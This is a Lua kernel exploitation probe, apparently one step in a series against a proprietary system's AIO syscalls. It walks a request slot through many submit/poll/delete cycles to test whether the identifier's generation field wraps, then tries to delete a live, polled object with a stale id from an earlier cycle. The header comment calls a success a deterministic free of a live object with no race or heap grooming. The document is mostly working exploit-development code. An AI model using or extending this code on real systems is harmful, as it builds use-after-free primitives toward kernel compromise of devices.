-- CRASH_CLASS: MODERATE
-- PROBE 1472a: AIO id generation wrap -- does the 3-bit field wrap while the slot lives on?
--
-- Context:
--   1447a (results/phase36_realargs/1447a_aio_stale_id_alias_20261109_180913.txt) measured:
--     - classes 1, 2 and 3 all submit and behave identically (id examples 0x4205 / 0x6205 / 0x8205
--       on the same slot 0x205, so the class argument does not select a different object layout)
--     - a stale id one generation behind a live object is REJECTED with 0x80020003, which is a
--       strict equality check, not the 13.60 `gen < counter` inequality
--     - four poll+delete+submit rounds on one slot walked the generation 5 -> 6 -> ... -> 9, so the
--       generation field holds at least four bits even though the table's separator is 0x2000
--
--   The remaining hole is the wrap.  If the identifier carries a 3-bit generation while the slot
--   carries a wider counter, the equality check can only hold while both agree; once the identifier
--   wraps past 7 the same identifier value comes back for a different object, and an id saved from
--   cycle N becomes valid again in cycle N+8.  That would be a deterministic free of a LIVE object
--   using an id the caller kept from an earlier cycle -- no race, no heap grooming.
--
--   Phase A walks one slot for 24 poll/delete/submit cycles and prints the raw id each time, so the
--   width of the generation field is read off directly.
--   Phase B takes the id recorded in cycle 1, submits and POLLS a fresh request (so the live object
--   is in the deletable state), then calls 662 with the OLD id:
--       state 0x80020003 -> the stale id is still rejected, no wrap in this range
--       state 0           -> the old id deleted the live object: check the live id afterwards, a
--                            0x80020003 there means the object was freed through a stale handle.
--
-- -- prior art:
--   results/phase36_realargs/1447a_aio_stale_id_alias_20261109_180913.txt
--   results/phase36_realargs/1445a_aio_id_generation_20261109_171255.txt
--   probes/phase16_kwrite/65l_aio_race_fixed.lua (662 status protocol)
--   probes/phase17_new_vectors/465a_aio_complete_then_delete.lua (669 request shape)
--   docs/AIO_BATCH_14_10.md, docs/AIO_GATE_14_10.md

print("=== PROBE 1472a: AIO GENERATION WRAP ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local AIO_SUB  = make_syscall(669)
local AIO_POLL = make_syscall(664)
local AIO_DEL  = make_syscall(662)
local GETPID   = make_syscall(20)
local SSOCKET  = make_syscall(135)
local WRITE    = make_syscall(4)
local MAP      = make_syscall(477)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function sgn(rv) local n = to_num(rv) if n < 0 then return -1 end return n end
local function rd(a) local ok, v = pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return -1 end
local function wr(a, v) pcall(function() memory.write_dword(a, uint64(v)) end) end
local function wrq(a, v) pcall(function() memory.write_qword(a, uint64(v)) end) end
local function hex(n) return string.format("0x%08X", n) end

local pid = sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("canary getpid=%d", pid))
print("")

local ok, va = pcall(function() return MAP(uint64(0), uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local p = ok and to_num(va) or -1
if p < 0x10000 or p > 0x8000000000 then print("mmap failed -- aborting"); print("=== PROBE 1472a ABORT ==="); return end

local REQ    = p + 0x0000
local DATA   = p + 0x0100
local RESULT = p + 0x0200
local IDS    = p + 0x0300
local STATE  = p + 0x0400
local PAIR   = p + 0x0500

local sp = sgn(SSOCKET(uint64(1), uint64(1), uint64(0), uint64(PAIR), uint64(0), uint64(0)))
local rd_fd = rd(PAIR)
local wr_fd = rd(PAIR + 4)
print(string.format("[0] socketpair rv=%d read=%d write=%d", sp, rd_fd, wr_fd))
if rd_fd <= 0 then print("socketpair failed"); return end

local function as_addr(t) local s = tostring(t) local m = s:match("0x(%x+)") if m then return tonumber(m, 16) end return to_num(t) end
local payload = memory.alloc(16)
local PL = as_addr(payload)
for i = 0, 15 do pcall(function() memory.write_byte(uint64(PL + i), 0x41 + i) end) end

local function feed() pcall(function() WRITE(uint64(wr_fd), uint64(PL), uint64(16), uint64(0), uint64(0), uint64(0)) end) end

local function arm()
    for j = 0, 0x24, 4 do wr(REQ + j, 0) end
    wrq(REQ + 0x08, 16)
    wrq(REQ + 0x10, DATA)
    wrq(REQ + 0x18, RESULT)
    wr(REQ + 0x20, rd_fd)
end

local function submit()
    arm()
    wr(IDS, 0)
    wrq(RESULT, 0)
    local rv = sgn(AIO_SUB(uint64(1), uint64(REQ), uint64(1), uint64(1), uint64(IDS), uint64(0)))
    return rv, rd(IDS), rd(RESULT)
end

local function poll1()
    local id = rd(IDS)
    wr(STATE, 0x5A5A5A5A)
    local rv = sgn(AIO_POLL(uint64(IDS), uint64(1), uint64(STATE)))
    return rv, rd(STATE), id
end

local function del1()
    wr(STATE, 0x5A5A5A5A)
    local rv = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
    return rv, rd(STATE)
end

--------------------------------------------------------------------------
-- [A] walk one slot and read the identifier field off directly
--------------------------------------------------------------------------
print("[A] 24 poll/delete/submit cycles on one slot")
local first_id, first_slot, first_gen = 0, -1, -1
local seen = {}
local slot_changes = 0
local cycle = 1
while cycle <= 24 do
    feed()
    local rv, id, res = submit()
    if id == 0 then
        print(string.format("  cycle %d: no id (result %s)", cycle, hex(res)))
        break
    end
    local slot = id % 0x2000
    local gen  = math.floor(id / 0x2000) % 8
    local high = math.floor(id / 0x10000)
    if first_id == 0 then first_id, first_slot, first_gen = id, slot, gen end
    if slot ~= first_slot then slot_changes = slot_changes + 1 end
    seen[gen] = (seen[gen] or 0) + 1
    local rvp, stp = poll1()
    local rvd, std = del1()
    print(string.format("  cycle %2d: id=%s slot=0x%03X gen=%d high=0x%X poll=%s del=%s",
        cycle, hex(id), slot, gen, high, hex(stp), hex(std)))
    cycle = cycle + 1
end
local distinct = 0
for _, _ in pairs(seen) do distinct = distinct + 1 end
print(string.format("  first id %s (slot 0x%03X gen %d); slot changes=%d; distinct gens=%d",
    hex(first_id), first_slot, first_gen, slot_changes, distinct))
print("")

--------------------------------------------------------------------------
-- [B] submit + POLL a fresh object, then delete it with the first id
--------------------------------------------------------------------------
print("[B] stale id from cycle 1 against a live, polled object")
feed()
local rv, live_id, res = submit()
if live_id == 0 then
    print(string.format("  submit published no id (result %s)", hex(res)))
    print("=== PROBE 1472a COMPLETE ===")
    return
end
local live_slot = live_id % 0x2000
local live_gen = math.floor(live_id / 0x2000) % 8
local rvp, stp = poll1()
print(string.format("  live id=%s slot=0x%03X gen=%d poll state=%s", hex(live_id), live_slot, live_gen, hex(stp)))

wr(IDS, first_id)
wr(STATE, 0x5A5A5A5A)
local rvS = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
local stS = rd(STATE)
print(string.format("  662 with the cycle-1 id %s -> rv=%d state=%s", hex(first_id), rvS, hex(stS)))
if stS == 0 then print("  *** STALE ID ACCEPTED ***") else print("  stale id rejected") end

-- is the live object still there?
wr(IDS, live_id)
wr(STATE, 0x5A5A5A5A)
local rvL = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
local stL = rd(STATE)
print(string.format("  662 with the live id %s -> rv=%d state=%s", hex(live_id), rvL, hex(stL)))
if stL == 0x80020003 and stS ~= 0x80020003 then
    print("  *** the live object is gone although its own id was never used: alias confirmed ***")
elseif stL == 0 then
    print("  the live object was still deletable by its own id: no alias")
end

print("")
print(string.format("[Z] alive pid=%d (was %d)", sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))), pid))
print("")
print("=== PROBE 1472a COMPLETE ===")
